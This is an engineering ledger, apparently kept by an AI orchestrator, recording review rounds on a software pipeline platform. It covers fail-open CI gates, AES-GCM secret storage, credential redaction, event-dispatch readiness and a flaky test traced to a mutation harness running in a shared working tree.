**Assumptions, each written where the code is.** A return is attributed to a bounded loop by the stage it
comes *from* (`RETURN_LOOPS`), and a stage with no attribution escalates — filed as **Q56**, because it is a
product decision about custom stages. `implementation → architecture` and `architecture → refinement` share
`architecture_revisions` deliberately. A verdict is read from the artifact's structured `data` and never from
prose; a type with no verdict field (`ImplementationPlan`, `ImplementationNotes`) treats "the artifact the
template asked for validated" as the approval, which is a fact about the platform's validation rather than a
field the model can omit. `rebase` joins BD-008's loops with product/04 S6b's two attempts.

**For whoever wires this into `apps/server`.** `createPipelineRuntime` returns the handlers and starts the
workers; nothing registers them yet, because a project's integration **bindings** (which GitLab, which Jira,
with which credentials) have no loader — that is the missing piece between this and a running instance, and
it is listed under discovered work.

**Round 2 — the two branches the tests never executed were both guards.** Review round 1 returned
REQUEST_CHANGES with two majors of one shape: an implementation that looks correct and that the reviewer had
to **mutate** to show was unheld.

- **The code-review convergence escalation** (product/04 S5, `saga.ts`) was executed by no test in any tier:
  `return false;` before `recentStageSignatures` disabled it and all 3659 unit+contract tests stayed green
  (the reviewer's measurement). It is one of the two behaviours migration 0012's `signature` column exists
  for, and the one defect 3 above was fixed *for* — a lesson kept in prose while nothing held the code
  (rules 30 and 10). It now has the CI half's shape: two reviews with identical structured findings escalate
  with `the review reported the same findings as the previous round` at `code_review` counter **1** of 3, and
  a second review with *different* findings carries on instead. Re-running the mutation kills
  `stops when the re-review reports the same findings, instead of burning the loop` by name, and the message
  is the distinction itself — `expected 'code_review iteration limit of 3 reac…'`, the loop merely running out.
- **The CI gate's failure branch** (`gates.ts`) was untested everywhere **and fails open**: settling
  `CI_TERMINAL_FAIL` as `{passed: true}` also left 3659 tests green, and no e2e drove it — the harness's
  `ciStatus: 'failed'` had no consumer. `ci_gate` is a `BUILTIN_GATE_STAGE_ID`, so the stage job polls
  `pipelineStatus` whatever the template's `on` says, and the bug therefore **advances a task to code review
  on red CI**. Fourth fail-open guard this session (rule 14). `gates.test.ts` now calls the evaluator directly
  over `failed`/`canceled`/`skipped`, asserting `passed: false` **and** the `detail` — the Q55 cut, so closing
  Q55 breaks a test rather than nothing — and the e2e drives a red pipeline end to end. Under the mutation
  that e2e dies with `expected 'ready_for_merge' to be 'needs_human'`: the fail-open, observed.

The gate evaluator's whole **refusal** surface is executed rather than inspected as well (a `command` gate, a
custom gate with and without an event, a task with no merge request, a merge request with no head sha, a
project with no git binding). `isPlatformGate` was exported and imported nowhere, and is deleted. product/04
S4 now carries one bullet saying what the platform does today and pointing at **Q55**, because the cut lived
only in this ledger and docs win over code (rule 8).

### WP-15a — the pipeline is composed into `apps/server`, and what that turned out to cost

**The acceptance criterion is met.** `verify:e2e` walks a feature ticket and a bug ticket from
`ticket.matched` to `task.completed` through an **`apps/server` instance started by `startInstance`** —
the real composition root, the real outbox worker on its own timer, the real pg-boss jobs runtime — with
the git and task-management adapters built by a production loader from seeded `integrations`, `secrets`
and `bindings` **rows**. `test/e2e/support/pipeline.ts` no longer calls `createPipelineRuntime`.

**The mutation that proves the rows are load-bearing — and what round 1 of it actually proved.**
Removing the two `insert into bindings` statements fails **all five** e2e tests. Before round 2 the stop
was `state=needs_human stage=rebase_gate`, and the reviewer showed that verdict was *downstream of a
green CI gate*: `ci_gate` precedes `rebase_gate` in all three templates, and it was failing open, so the
run walked past the first provider-dependent step and parked later for a different reason. With the gate
fixed the same mutation parks at **`stage=ci_gate`** — the first step that asks a provider anything,
which is what "the bindings are load-bearing" should look like. *A falsification that stops in the right
state for the wrong reason is not a falsification*, and only enumerating the template order showed it.

**Three orientation claims were checked and one was wrong (rule 27, eighth instance).** The plan row says
the loader decrypts "through the existing broker". *There is no such broker.* `workspace/broker.ts` is the
run-scoped **git credential** broker (TD-021) — it mints per-run tokens and has nothing to do with
`secrets.ciphertext`. Nothing in the repository read that column, nothing imported `node:crypto` for it,
and no work package owned it: `grep -rln "APP_SECRET_KEY|decrypt|SecretStore"` over `packages/` and
`apps/` returned five files, all of them configuration or auth. So WP-15a built it — `SecretStore` port,
AES-256-GCM envelope with a per-row data key, `PostgresSecretStore` — because a loader that cannot read a
credential cannot build an adapter, and a loader that read a *plaintext* one would have left the single
piece of this work package that touches a secret untested. The other two claims held: the tables really
are `integrations`/`bindings`, and `createPipelineRuntime` really had no production caller.

**`PipelineIntegrations` had to become a port, and that was not in the brief.** `PipelineSagaOptions`
took one composed `PipelineIntegrations` for the whole process — correct for a harness with one project
and wrong for an instance that serves many. It is now `PipelineIntegrationsPort.forProject(projectId,
scope)`, the same shape `ProjectSettingsPort` already had. *This paragraph said "four call sites"; there
are six* — the reviewer enumerated them, which is rules 7 and 37 in one line: a count is a checkable
claim and a hand-maintained one drifts. The number is now not stated anywhere at all.
`packages/application/src/pipeline/integrations.test.ts` walks the ring's own sources and requires the
named `noRunScopedSecrets()` at every site, so the *seventh* call site has to make the same decision
rather than inherit an inline empty literal. Mutating one site to `{ runScopedSecrets: [] }` fails it
with the file and line. The gate evaluator resolves it
**after** `merged_gate` returns, deliberately: that gate is settled by the event that got the task there,
so loading a binding for it would let an unrelated misconfiguration fail a gate that needs no provider.

**Q55: the mechanism is closed, the product cut is not, and the split is deliberate.** `IntegrationCallScope`
is **required by the type** and carries the run-scoped credentials; the loader composes them into
`ProviderCreateInput.redactor` and builds adapters **per call**, which is Q55's option (a). Rule 35 says the
type only proves *supply*, so the behaviour is pinned by a test that plants a token in a job log the **real**
GitLab adapter returns and greps the output. What is **not** closed is the CI gate: it still returns failing
job names, `gates.test.ts:167` still pins that, and nothing on the pipeline's path holds a minted credential
because the runner cannot reach the launcher's broker (Q52). Every call site passes `noRunScopedSecrets()`,
written out in full. The decision is recorded on Q55 itself and at the top of `bindings/loader.ts`.

**Two guards, two named deaths (rules 3, 22, 35).**

- deleting the **scope** half of the composed redactor kills
  `packages/integrations/src/bindings/loader.test.ts` › "keeps a run-scoped credential out of what a provider returns",
  with the token visible in the assertion's message;
- deleting the **binding** half kills
  `packages/integrations/src/bindings/loader.test.ts` › "redacts a credential the provider does not redact for itself",
  and **nothing else** — measured, because both registered adapters compose a redactor over
  their own credentials. That is rule 41's shape, so rule 22 applies: the layer is declared at the line, the
  outer guard is named (`providers/emitted-secrets.test.ts`), and the reason it is still worth having is
  that that file is a hand-written list of *two* providers rather than a sweep of `providers/` (rule 7);
- deleting the `options.pipeline === undefined` warning in `runtime.ts` kills
  `test/e2e/pipeline/composition.e2e.test.ts` › "names the event types it cannot handle and does not start the outbox sweep",
  which also asserts the other half — the event **dispatches** and no task is created, so it is a statement
  about the branch that ran rather than about a process that had not started yet (rule 10). *(WP-15b renamed
  that file from `uncomposed.e2e.test.ts` and inverted the branch: absent now **composes**, and the seam the
  test drives is `pipeline: null`.)*

**A defect the tests caught before it shipped.** `repositoryPathOf` read `git@host:acme/api.git` as the
project `api`: the first `/` is inside the path, not after the host, for git's scp-style remote. Two
spellings reach `projects.repo_url` and they separate the host from the path differently; a `:` followed by
digits is a port and not the separator. Fixed with the enumeration in `pipeline.test.ts`.

**Two things measured and written down rather than assumed.** `bindings` is ordered `by i.type, …`, and
`type` is an **enum** — PostgreSQL orders it by the order migration 0002 declared its labels, so
`task_management` sorts *before* `git`, not alphabetically. The integration test asserts it as it behaves
and says why. And the e2e now runs in **real** time: ~27 s for five tests at load average 5, with
`APP_JOBS_POLL_INTERVAL_SECONDS=0.5` and `APP_DISPATCH_POLL_INTERVAL_MS=25`. Nothing asserts a duration
(rule 2); `settle` waits for a *state* and reports the dispatcher's own recorded error if a handler died.

**What this work package refused to build, with the reason.** `apps/server` **cannot** compose the whole
pipeline on its own, and pretending otherwise would have been rule 18 in the composition root:

- ~~**`ClaudeRunner`** needs a workspace, and the runner→launcher transport is **Q52**, deliberately unbuilt~~ — **CLOSED at WP-15g** (`apps/server/src/agent.ts`); what stays unbuilt is only Q52's *out-of-process transport*, and the runner needs none, because TD-025 §2 already gives it a socket-free path;
- **`IntegrationAuditLog` / `IdempotencyStore`** have ports (WP-07) and no adapter, and
  `integration_actions` (migration 0007) has no `project_id`, `redaction_count` or `attempts` column — so an
  adapter needs a **migration** as well as code.

So `StartRuntimeOptions.pipeline` is required to start the pipeline, and a process without it logs which
piece is missing and starts no pipeline. That is the fail-closed direction — no task advances, loudly,
rather than every task advancing with no audit row. The executor's own redactor is **not** a no-op: it is
TD-012 **step 2** (`patternRedactor()`), because step 1 is per-binding and lands in the loader.

**The shipped registry is two providers, not five.** The loader builds a git provider and a task manager;
registering Slack, Sentry and Loki would be three entries constructed by nothing, which is rule 68's shape.
They belong to the composition root that consumes them.

### WP-15a — review round 2: the fifth fail-open guard, and a falsification that proved the wrong thing

Round 1 returned REQUEST_CHANGES with two majors and three smaller items. The first major is the one
worth keeping, because it invalidated the evidence the work package was reported on.

**1. `ci_gate` settled `passed: true` for a project with no git binding.** `gitReads.pipelineStatus`
answers `null` for an unbound project, and `getPipelineStatus` answers `null` for a commit that has no
pipeline — and product/04 S4 makes the second of those **pass** ("the local test run is the evidence").
One `null`, two producers, opposite correct answers: standing rule 56's shape with a gate on the end.
`rebase_gate`, four lines below it, already returned `unsupported` for the same condition, and that
asymmetry inside one file is what a reviewer saw. It is the **fifth** fail-open guard this project has
found (rule 67's list: WP-07's shadow guard, WP-12's two, WP-15's CI gate, now this).

The gate now asks `bindings.git === null` **by identity**, before either branch reads anything.
Reverting it fails `gates.test.ts` › *"refuses the CI gate when the project has no git binding, instead
of passing it"* with `{kind:'settled', passed:true}` in the message — and leaves the rebase case
**green**, because the branch below it answers the same way. That is rule 41 (one condition, two guards),
so rule 22's remedy is applied at the inner one: declared unreachable, naming the outer guard, with the
measurement written at both. The pair is labelled in the test — *the CI case is the guard's test, the
rebase case is the behaviour's*. The set is derived rather than remembered: a third test asserts
`BUILTIN_GATE_STAGE_IDS` minus `merged_gate` equals the two cases, so a fourth builtin gate fails it.

**The consumer sweep rule 63 asks for, done rather than promised.** The other two `gitReads` consumers
were audited for the same collapse: `saga.ts`'s `unprotectedDefaultBranch` reads `null` as "protected or
cannot tell" (fail-closed, correct), and `jobs.ts`'s review window reads `[]` as "nothing unresolved" and
returns without advancing anything (not permissive). Neither needed changing; both were checked.

**2. The nonces were unpinned.** Replacing either `randomBytes(IV_BYTES)` with `Buffer.alloc(IV_BYTES)`
left all 19 envelope tests green — the ciphertexts still differed, because the data key is random too, so
"is different every time" said nothing about the IVs. The wrap IV is the sharp one: it sits under one
process-wide KEK, so a constant there is GCM nonce reuse across **every row in the table**, and AES-GCM
loses *authenticity* as well as confidentiality under it. A 64-seal census over the exported field offsets
now pins all three random values, and each of the two mutations kills the one test written for it and
nothing else. Rule 33's shape away from `scripts/`: the place a mutation survives is the place the next
change breaks. *(Round 3 replaced that census — it admitted a counter — and renamed the test; the name
this paragraph originally cited no longer exists, which is why it is described rather than cited.)*

**3. The uncomposed production state was worse than "nothing runs", and that is now the part of this work
package I would keep if I kept one thing.** `main.ts` and `scripts/dev.mjs` call `startRuntime()` with no
arguments, so the pipeline is composed and production does not start it. Two consequences round 1 did not
report:

- **a `ticket.matched` arriving at such an instance was eaten.** With zero handlers `EventBus.dispatch`
  takes the "no handler matched" path: `dispatchQueue.complete(position)` deletes the `event_dispatch`
  row and a `$dispatch` marker goes into `handler_executions`, which makes a later re-dispatch a
  deliberate no-op. The event was consumed and unreplayable by a process that was never able to act on
  it. Rule 20's inbound half: *being told something you cannot handle is not licence to forget it.* The
  outbox sweep is no longer started when the bus has **no handlers**. The event stays queued with
  `attempts = 0` for an instance that can act on it. The cost is stated rather than hidden: the queue
  grows, `event_dispatch_pending` is the gauge that shows it, and `/readyz` is down for the same reason.

  > **Round 3 corrected this, and the correction is the interesting part.** The clause that used to
  > follow — "that condition and not *the pipeline is absent*, because a later projection should still
  > sweep" — was **wrong**, and it was wrong in the direction the fix was meant to close. Measured at
  > the bus by the round-2 reviewer: a registry holding **one handler for an unrelated type** dispatches
  > a non-matching event to `status: 'dispatched'`, because `handlersFor(type)` returns `[]` and the
  > code completes. So the projection-only instance this sentence blessed would eat a `ticket.matched`
  > exactly as an empty one did, *and* `/readyz` would read `ok`, taking the second signal with it. It
  > is rule 9's **over-discharge** direction: two paths each correctly saying "nothing to do here".
  > The architect ruled that *a process that sweeps must be a complete consumer*, and the sentence is
  > gone rather than qualified — see round 3's notes.
- **`/readyz` was green.** Database, migrations and queue were all `ok`. TD-023's three checks did not
  cover the state the build is in, so there is a fourth, `dispatch`, and it is **required** on
  `ReadinessOptions` rather than optional — six existing call sites had to state it, which is the point
  (rule 31). `readiness.test.ts` › *"is down when the dispatcher has no handlers, however healthy
  everything else is"*.

**And the first version of that e2e passed with the guard removed.** It asserted "the row is still in
`event_dispatch`" immediately after the append — a negative, against a sweep that simply had not got
there yet (rule 4). Two changes fixed the instrument, and the second is the one worth copying: the queue
assertions moved to **after `runtime.stop()`**, because shutdown drains the dispatcher and that is the
one moment at which "still here" means "nothing ever swept it"; and the test then hands the **database**
to a second, composed instance and waits for the ticket to reach `ready_for_merge`. That turns the
property into a positive one — *the instance that could not act on the notification did not destroy it,
and the next one that can, does* — and it is time-free in the failing direction. Under the mutation the
first assertion now fails in 400 ms with `expected [] to have a length of 1`; before the fix the same
mutation was green.

**4. A whole envelope could be transplanted between `secrets` rows.** `openSecret(key, ciphertext)` took
the ciphertext alone, so an envelope copied from one row into another decrypted perfectly and a binding
silently got another account's credential. The docblock's splice claim read wider than it was: the splice
test only ever cut an envelope in half. The row's own uuid is now in the **wrap's** AAD — identity
material, never a redaction output (rule 70) — which means the caller generates the id before the insert
rather than letting the column default produce one. Removing it from the AAD kills two named tests, one
at the envelope and one at the store.

**What was refused, again, and filed instead**: the Postgres `IntegrationAuditLog` and its migration, and
the absence of any webhook ingress, which means nothing in production emits `ticket.matched` at all. The
third item — the e2e replacing the registry wholesale, so the **shipped** GitLab and Jira `create` were
reached by no tier through the loader — turned out to cost about sixty lines at the *integration* tier
rather than another e2e, because neither registration performs I/O at construction, so it was closed
rather than filed.

**One flake, found by running the target rather than by reasoning about it.** `keeps one workpad comment
on the ticket and moves the ticket status` settled on `tasks.state === 'ready_for_merge'` and then read
the ticket — but the status mapping is a handler in TD-005's *integrations* band, so it commits after the
core transition. One transaction's effect asserted against another's timing: it failed 1 run in 3. The
harness grew `waitFor`, which waits on the consequence instead of on the state, and the docblock says why
the two are different. Three consecutive runs of the file are green.

### WP-15a — review round 3: the arbiter moved from the dispatch site to composition

Round 2's fix was right about the harm and wrong about the predicate, and the reviewer's measurement is
the whole finding: a registry holding **one handler for an unrelated type** dispatches a non-matching
event to `status: 'dispatched'` — `handlersFor(type)` returns `[]` and the code completes. So
`registry.size === 0` closed the empty case and left the *partial* case open, and my docblock had
blessed exactly that ("a later projection should still sweep"). Rule 9's **over-discharge** direction,
and rule 56: the false branch of a whole-registry predicate does not enumerate a per-type question.

**The architect ruled, and the dispatch site does not change.** Completing an unmatched event is
correct: leaving it queued makes `hasEarlierPending` block every later event of the same stream, so one
never-handled type would permanently halt each aggregate that emits it, and the queue could not tell
`knowledge.index.rebuilt` (catalogue consumer `—`) from a missing pipeline. Completing is safe because
`events` is append-only and the application holds no `DELETE` on it: only the **work item** dies, and a
handler added later is served by a backfill from the log. What changes is **who may sweep**:
`event_dispatch` has one row per event for the whole deployment, so a partial consumer destroys another
process's work item exactly as an empty one does. `packages/application/src/events/consumption.ts`
declares each catalogue type `handled` or `unconsumed`, and `sweepReadiness` is **one predicate called
by both gates** — the outbox-worker start and `/readyz`'s `dispatch` check (rule 41).

**Where I deviated from the ruling, with the measurement, because the ruling invited it.** The ruling
says the table is sourced from technical/02's "Core consumers" column. Read literally that column marks
**49 of 50** types consumed — it describes the finished product's consumers, including the Slack band,
the UI band and the cost ledger. Measured, a composed `apps/server` registers handlers for **21**. A
table transcribed from the column would stop the outbox worker in *every* build that exists, including
the one whose e2e walks a ticket to `task.completed` — this work package's own acceptance criterion. So
the table records **what this build consumes**, and every `unconsumed` row names the work package that
flips it. Every property the ruling protects survives: a sweeper must be complete for everything
declared consumed, a missing handler fails a named test, and a new event type cannot be added without
answering the question. What it does not do is declare consumers that do not exist.

**The entry worth reading is `run.finished`/`run.failed`**: technical/02 gives them a cost ledger at
priority 10, WP-19 builds it, and nothing registers it — so a `run.finished` swept today is a cost
entry that will never be written. Declared rather than silent, and it is why the backlog carries the
backfill tool as something WP-19 needs *before* it ships.

**The guarantee, mutation-checked.** Adding a 51st member to the catalogue union without touching the
table kills `packages/application/src/events/consumption.test.ts` › "answers for every catalogue event type, and for no type that is not one", naming `task.mutant_added`. Repointing one pipeline handler from `default_branch.moved` to an
unconsumed type makes `sweepReadiness` answer `{ready: false, missing: ['default_branch.moved']}`. The
refusal is parameterised over the declared set, so each `handled` type has its own case.

**Also in this round, from round 2's four smaller items.**

- **The nonce census admitted a counter** (rule 43). A per-process `writeUInt32BE` counter produced 64
  distinct values and passed all 13 tests; distinctness *within one process* is not what the docblock
  claims, and two replicas each counting from 1 collide on every row. A unit test cannot establish
  unpredictability — that is a property of `randomBytes`, and the docblock now says so — but it can
  reject a **structured** generator: 256 seals, and **every byte position must vary**. Three counter
  shapes die, including a hybrid of 4 random bytes and an 8-byte counter, and the failure names the
  constant positions.
- **"Rotating rewraps 32 bytes per row" was false**, and the measurement that mattered came first:
  replacing the body's AAD with a constant left **all 13 tests green, including the splice case**, so
  the body↔key binding the docblock credited with refusing a splice was refusing nothing — the per-row
  **random data key** is what refuses it. That made the fix cheap: both layers now take
  `version ‖ secrets.id`, which is stable across a rewrap, and `rewrapSecret` is a **function with a
  test** rather than a sentence (rule 30). The test asserts the body bytes are copied through
  identically, which is the actual claim: the credential never materialises in a rotating process.
- **TD-023 is amended** with the fourth readiness check, and it carries the consequence that was
  written down nowhere: `ROLE=all`/`worker` are 503 until a pipeline is composed, `ROLE=all` also
  serves the API and the SPA, so **WP-22 must not gate `depends_on` on `/readyz`** and no reverse
  proxy may use it as an upstream health check. `routes/ops.ts` and the OpenAPI description point at it.
- **`toContain('ready_for_merge')` was satisfied by the workpad checklist**, which names every stage of
  the template from the first render — so it would have passed on a task that never reached the state
  (rule 10). It asserts the header line now, which is the only part that reports where the task is.

### The `verify` flake was a mutation harness running in the shared working tree

The orchestrator saw `FAIL: verify` once in eight on `1ab02bc`, then seven passes, and lost the test
name to a `tail -6` — rule 61's mistake in miniature, and the reason the hunt had to start from
scratch. Twenty sequential runs with **the output captured to a file per run** caught it three times.

**The failing values identify the cause exactly.** `envelope.test.ts` reported
`constantPositions: [4,5,6,7,8,9]` — the signature of the *4 random bytes + 8-byte counter* hybrid
this session used to mutation-check the nonce census — and `events.test.ts` reported a 51st catalogue
type, `task.mutant_added`, which is the literal name of the mutant used to prove the consumption
table's key check. Neither value can arise from clean sources. A **reviewer was re-deriving those two
documented mutations in the same checkout**, so a `vitest` run started by somebody else collected the
tree mid-mutation.

**Counts.** With the review finished and no other agent running: **0 failures in 20** on `60e925a`,
**0 failures in 20** on `main` (`24b3e65`), both sequential, at load average 9–14. An instrumented
loop that hashed `events.ts` and `envelope.ts` before and after each run reported the files unchanged
in 12 of 12 — which is the negative result that fits: by then nobody was mutating them.

**The rule this is a new spelling of.** Rule 53 says a verification run must be scoped to the checkout
it claims to verify; this is the same failure with the checkout *right* and the **tree** wrong. A
mutation harness is a writer, and two agents sharing a working tree cannot both run one — the second
one's `verify` is measuring the first one's mutant and has no way to know. Nothing in the protocol
forbids it today; the cheap mitigations are a reviewer in its own worktree (which rule 66's machine
policy discourages) or a mutation harness that refuses to run when the tree is not clean, and neither
is this work package's to build. What it costs when it is not done is a day of hunting a flake that
was never in the product: **the failure was real, reproducible, and not a defect.**

### WP-20 — the browser's own `lastEventId` would have undone the `reset`

The finding worth keeping from the web foundation, because it is the other half of the defect that cost
WP-06a seven layers: **`EventSource.lastEventId` persists across control frames.** The client drops a topic's
cursor when a `reset` arrives — that is the whole point of `reset`, the server saying it cannot prove what you
missed — but reading the browser's buffer on the next reconnect **resurrects the dropped cursor** and asks
again from a position the server already disclaimed. The client therefore derives its cursors from each
frame's own `topic`/`seq` instead, and sends **all** of them on reconnect.

The hub's docblock enumerates every quantity the *server* shares between replay and live. This is the same
class one process further out: **a quantity the platform thinks it owns, which the browser is also keeping.**

**Also worth copying:** untrusted text is never converted to HTML at all — no markdown-to-HTML, no sanitiser,
**no sink** — with `no-html.test.ts` failing the build if one appears. That is rules 30 and 33 applied
together: not "we escape carefully" written in a docblock, but a check that makes the unsafe construct
impossible to add. Fenced code becomes `<pre><code>` text, links are `http(s)`-only through `new URL()`,
images and raw HTML render literally, ANSI is stripped, and Trojan-source bidi becomes U+FFFD.

**Question numbering collided a fourth time**: WP-13 and WP-20 both took Q44 and Q45 from parallel worktrees.
WP-13 merges first and keeps them; WP-20's Q44-Q48 become **Q46-Q50**. Four collisions, four caught, none
silent — the convention holds because every implementer reports which numbers it took.

### Mutation-harness hygiene: a restore script is scoped to the files you have already touched

From WP-11a round 2, reported unprompted: the implementer's snapshot-and-restore script covered only the
files it had modified **at the time it was written**, so a later mutation to `loki/provider.ts` — a file it
had not yet touched — **survived the restore**. It was caught by `git status`, not by the script.

This is the rule 21 family one level out: the harness that *reports* results was canaried, but the harness
that *undoes* them was not. Widen the snapshot to every file a mutation may touch, and check `git status`
after the run regardless of what the script claims. The same instruction now goes to every reviewer.

Also recorded from that round, because it is the honest kind of self-report: their first placement of a
shared-suite obligation landed in the **errors** suite, where `capabilities().labels` is `undefined` — so it
**passed green and empty**, and only typecheck caught it. A contract-suite case placed in the wrong suite is
a vacuous pass wearing a green tick (rule 4). That branch now asserts `unsupported_capability` instead of
returning.

### Rule 27 caught an orchestrator prescription that contradicted itself

WP-20's round-2 brief told the implementer to wrap five sites in `safeHref(...) ?? undefined` **and** to
extend `no-html.test.ts` to forbid `href=` outside `ui/untrusted.tsx`. Those two instructions are
incompatible: the first leaves `href=` in five files, which the second then forbids. The implementer
measured the prescription, found the contradiction, and used an `ExternalLink` component instead.

**Fourth time this session a prescribed fix has been wrong** (rule 27), and the first where the prescription
was the orchestrator's *and* internally inconsistent rather than merely suboptimal. The others: WP-06a's
`#queued >= cap + replayOutstanding` (algebraically identical to the gate it replaced), WP-06a round 2's
one-directional arbitration flag, and WP-12's whole-string NFKC fold (which would have mapped U+FF0F onto a
path separator). *A fix arriving with authority is still a hypothesis* — including when the authority is the
one writing the brief.

### Checkpoint 2 — nineteen work packages, M1's spine complete but not yet joined

**What works end to end.** Still nothing user-facing, but every component M1 needs now exists and is green:
a Fastify server with auth, RBAC, OpenAPI and an SSE stream whose replay path survived seven layers of one
defect; an event store with a priority dispatcher, outbox and per-stream ordering; jobs and timers on
pg-boss with a working-day calendar; **five integration providers** — Jira, GitLab, Slack, Sentry, Loki —
each behind a type port with a fake, a reusable contract suite and recorded fixtures whose provenance is
enforced by a test; the **Claude SDK runner** with hooks, path guards, redaction and thirteen golden
fixtures replayed through the real `query()`; the **run shim** that spawns the CLI and brokers credentials
without holding any; and a **web foundation** with 245 ui tests, 33 Playwright specs and a bundle budget CI
enforces.

**What is missing, and it is the part that makes it a product.** WP-14 (launcher and workspaces) is in
flight; **WP-15 (pipeline interpreter, stage executor, sagas) has not started**, and it is where all of the
above is first exercised together — one feature and one bug ticket through the whole loop against fake
Claude. Until WP-15 lands, this repository is a set of capable components that have never met.

**Quality signal.** Nineteen work packages, roughly forty review rounds, and **fifty-one standing rules,
every one with a reproduction**. The reviews were not ceremony. In this session alone they found: an SSE
defect seven layers deep whose test harness could not observe it; a webhook verifier that accepted
`HMAC-SHA256('')`; a shadow guard that failed open at runtime while the type said otherwise; a redactor that
was the identity function on the only production path; a credential broker that answered after the child
had exited; a path guard that let `conﬁg` overwrite `config` on APFS; a budget watchdog silent at
`NaN > ceiling`; ticket text that became an `@channel` broadcast; and a token "revoked" at the wrong
project while its holder was told it was gone. **Not one was found by reading the diff** — each needed an
exploit, a census, a mutation, a constructed interleaving, or a measurement against the real thing.

**The rules that keep recurring** are worth naming, because they are the ones later work packages should
expect to be caught by: a guard that another guard is quietly covering for (rule 4, four instances); a claim
in a docblock that no check enforces (rules 3, 44, 46, 48); a negative case every wrong implementation would
also reject (rule 43, three instances); a prescribed fix that was itself wrong (rule 27, four instances,
one of them the orchestrator's own and self-contradictory); and a measurement quoted without being
reproduced (rule 39, four figures corrected after the fact, one of which I had promoted into a standing
rule).

### gitlab/jira redaction follow-up — review round 2 (implementer notes)

Round 1 was APPROVE with two should-fix findings, one major raised in the walk, and prose corrections.
What round 2 did, and the decisions inside it:

- **Keys.** `redactJson` walks string *values*; a reviewer read a planted credential out of
  `{"errors": {"<token>": "…"}}` because `detailOf` interpolates Jira's field names. The fix keeps the shared
  helper as it is and redacts **at the emitting site**, which is what Loki already does for a label name and
  what `redaction.ts`'s docblock already prescribed. Widening `redactJson` was the reviewer's stated
  preference and was **not** taken: it would take collision handling away from the two sites that have it —
  Loki counts a colliding label into its truncation marker, and a shared walk has nowhere to report one — and
  it would leave Loki's own pass as a second, untestable guard (rule 41). The claim in the docblock is
  narrowed to say exactly this, and the reviewer's exploit body ships as a test that fails before it.
- **Headers were the real gap, and the walk had not driven the members that touch one.** `jiraDeliveryKey`
  copied the `x-atlassian-webhook-identifier` **header value** into a stored dedup key with no redactor on the
  path at all, and `gitLabDeliveryKey` quoted `object_kind` cut to 32 characters. Both now take a required
  `SecretRedactor`. GitLab's transport redacts response header names and values as a fourth pass; the honest
  bound is asserted rather than implied — `Headers` lower-cases a field **name**, so an exact-match redactor
  matches a secret in a name only when the secret is itself lower case.
- **The enumeration is derived, not remembered.** `emitted-secrets.test.ts` builds its scenario list against
  `Object.keys(port)` (with `inbound` expanded), so the five undriven members failed it until they were
  driven. Rule 37 in the redaction register rather than the cap one.
- **Rule 10, measured both ways.** The "serialised whole" assertion hard-coded `GITLAB_TOKEN.slice(0, 24)`.
  With the Jira adapter mutated to forget its own api token and the per-path assertion isolated: the round-1
  form left **all 11** Jira scenarios green; the parameterised form fails **8** of them.
- **Rule 39.** The question's two figures (it was Q52 then) were unreproducible, and one was attached to
  `MAX_COMMENTS = 100` as though it were a cap — it is `maxResults`, a request parameter. `providers/unbounded-emission.test.ts` now *produces*
  both numbers (53,284,565 B / 8 paths for one `readTicket` with 200 comments returned to a request for 100;
  1,180,284 B / 9 paths for one `getMergeRequest`) and the question cites the test.
- **Renumbering.** The question is **Q54** (WP-14 took Q52 and Q53 on its own branch). Nothing cites the old
  number any more: the only occurrences of `Q52` in the tree are these two notes, which are about the
  renumbering itself. **Q55** is new: `create()` runs before any mint, so the port's deferred obligation —
  "the caller passes it in `ProviderCreateInput.redactor`" — is unsatisfiable for a run-scoped token; WP-15
  needs a
  per-run adapter or a redactor resolved at call time. `git-provider.ts` now points there.
- **The "3215 tests" figure** from round 1's report appears **nowhere in the tree** (`git grep` is empty), so
  there was nothing to correct in a file; `verify` reports 3240 before this round's work. No total is pinned
  in prose by this change.
- Eight mutations, canary included, all dead by named assertions. One first-pass mutation reported ALIVE and
  was a **broken mutant** (a trailing comma inside parentheses); the harness now reports INCONCLUSIVE for a
  run that fails without naming a test, which is rule 21 with the failure mode it was written for.

### WP-14 measured WP-13's teardown residual — and the thing that was wrong was this ledger

WP-13's teardown was carried forward as an obligation for WP-14 to close with `docker stop`/`rm`, on the
premise that it *"signals one pid, and a detached grandchild survives it"*. WP-14 built the container e2e
to prove exactly that, and measured the opposite: **a detached grandchild cannot outlive its container's
PID 1.** The reviewer reproduced it independently in the VM's own process table (`--pid=host`): marker
count 1 while running, 0 after `docker stop`, 0 when PID 1 exits. The correction holds.

**But the source documents were never wrong.** The reviewer checked: `shim.ts:413-417` and
`research/12:184-190` already scope the survival to *the shim's own signal* and name the container as the
closer. No correction is owed to WP-13, to `research/12`, or to `killChild`'s docblock — the three places I
had queued for correction. The false statement was **this ledger's paraphrase of them**, and mine alone.

That is the finding worth keeping, because it is a failure mode of the orchestrator role specifically:
**a summary is a lossy re-statement, and the loss is almost always the scope qualifier.** WP-13's claim was
"survives *this signal*"; my ledger recorded "survives", full stop; and I then handed the broadened version
to WP-14 as an obligation to discharge. The chain ran source → ledger → brief, with the qualifier dropped
at the first hop and never recoverable downstream, because every reader after that point reads the ledger
rather than the code. Rule 39 says a measurement must reproduce from shipped defaults; this is its
companion — **a claim copied into the ledger must be re-read against its source, not against my memory of
it.** The cost here was one work package's brief aimed at a non-problem; the benefit was that aiming a
brief at it is what finally produced the measurement.

The general shape still stands, with the qualifier restored: **an obligation handed from one work package
to the next is a hypothesis about the next one's environment.** WP-13 measured on a host and could not have
measured in a container; WP-14 could, and did. The hand-off was still right — it is what caused the
measurement, and it cost less than the ledger error it exposed.

### Slack redaction + exclusivity claims + census timeouts (implementer notes, branch `fix/slack-redaction-and-census`)

The three follow-ups the redaction round-2 reviewer found, in one branch. All three are closed.

**Part 1 — `slackDeliveryKey` was the third instance, and the class now has a check.** Reproduced first,
executed rather than asserted: `slackDeliveryKey({headers:{},body:'{"type":"event_callback","event_id":"Ev-FAKE-PLANTED-…"}'})`
returned `slack:event:Ev-FAKE-PLANTED-…`. It now takes a **required** `SecretRedactor`, redacts the key it
returns, and redacts **before** the refusal's 32-character cut. Both mutations die by *named* assertions
(rule 3): the "supplied but not used" mutant — parameter kept required, body ignored, which is rule 35's
exact shape and leaves typecheck and every call site green — fails three named tests.

**The enumeration the last round did not do, in full.** Every path that turns provider text into a stored
identifier:

| path | what it copies | state |
|---|---|---|
| `jiraDeliveryKey` | `x-atlassian-webhook-identifier` header value | redacted (previous commit) |
| `gitLabDeliveryKey` | `object_attributes.*`, `object_kind` into a cut refusal | redacted (previous commit) |
